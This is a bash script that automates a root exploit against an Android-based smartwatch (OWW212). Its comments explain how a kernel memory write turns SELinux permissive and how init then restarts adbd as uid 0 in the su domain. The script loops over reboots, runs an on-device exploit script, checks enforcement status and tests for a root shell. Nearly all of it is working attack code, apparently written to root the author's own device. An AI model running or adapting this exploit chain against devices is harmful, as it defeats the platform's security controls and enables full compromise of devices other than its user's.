#!/usr/bin/env bash
# permissive -> init restarts adbd as ROOT, retried across fresh boots.
#
# Why this can work on OWW212 (all measured 2026-10-17, no heap address needed):
#   * /apex/com.android.adbd/etc/init.rc defines `service adbd` with NO `user`
#     line, so INIT STARTS IT AS UID 0; adbd drops itself to uid 2000 unless
#     `service.adb.root` says otherwise.
#   * `service.adb.root` is typed shell_prop, so the unprivileged shell may write
#     it in enforcing mode (verified: readback "1", no AVC).
#   * `ctl.restart adbd` is ctl_adbd_prop (denied to shell) but a permissive
#     kernel lets it through; one rb_erase zero-store at selinux_state is what
#     makes the box permissive -- fire e10 did exactly that and survived.
#   * `u:r:su:s0` is a valid context here (runcon answers EACCES, not EINVAL), so
#     the restarted adbd takes the su domain along with uid 0.
#
#   bash adbroot_loop.sh <label> [max_boots]
export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL='*'
ADB=/c/platform-tools/adb.exe
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
LABEL=${1:-arl1}
MAXBOOTS=${2:-10}
ENVFIRE="GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=1 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_SELINUX_OFF=0 GHOSTLOCK_WS_TARGET=enforce"
OUT="$ARCH/${LABEL}.txt"
: > "$OUT"

say() { echo "[$LABEL] $*" | tee -a "$OUT"; }
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-300} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 4; return 0; }
waitboot() { local m=${1:-300} w=0; while :; do b=$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r'); [ "$b" = "1" ] && break; sleep 4; w=$((w+4)); [ $w -ge $m ] && return 1; done; sleep 10; return 0; }

say "=== $LABEL start $(date +%H:%M:%S) boots<=$MAXBOOTS ==="
for n in $(seq 1 "$MAXBOOTS"); do
  if ! waitdev 300; then say "boot$n: NO-DEVICE (waiting longer)"; sleep 30; waitdev 300 || break; fi
  waitboot 360 || { say "boot$n: BOOT-TIMEOUT, rebooting"; $ADB reboot >/dev/null 2>&1; continue; }
  ge=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
  say "boot$n: up, getenforce=$ge"
  $ADB shell setprop service.adb.root 1
  say "boot$n: service.adb.root=$($ADB shell getprop service.adb.root 2>/dev/null | tr -d '\r')"
  timeout 240 $ADB shell "$ENVFIRE sh /data/local/tmp/fire.sh" >/dev/null 2>&1
  rc=$?
  L="$ARCH/${LABEL}-fire$n.log"
  $ADB shell "cat /data/local/tmp/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$L"
  grep -aE 'WS-DONE|HIJ-POST|HIJ-ENFORCE|exploit finished' "$L" | tail -4 | tee -a "$OUT"
  ge=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
  say "boot$n: fire rc=$rc getenforce=$ge"
  if [ "$ge" = "Permissive" ]; then
    say "boot$n: *** PERMISSIVE *** asking init to restart adbd"
    $ADB shell setprop ctl.restart adbd
    sleep 10
    waitdev 120 || { say "boot$n: device went away after restart -- waiting"; sleep 60; waitdev 240 || break; }
    for i in 1 2 3 4 5 6; do
      o=$($ADB shell id 2>&1 | tr -d '\r' | head -1)
      say "boot$n: id -> $o"
      case "$o" in *uid=0*) say "boot$n: *** ROOT SHELL ACHIEVED ***"; exit 0;; esac
      sleep 5
    done
    say "boot$n: adbd back but not root: $($ADB shell "ps -eo pid,user,name|grep adbd" 2>/dev/null | tr -d '\r')"
    exit 4
  fi
  say "boot$n: store missed, taking a fresh boot"
  $ADB reboot >/dev/null 2>&1
done
say "GIVE-UP after $MAXBOOTS boots"
exit 5
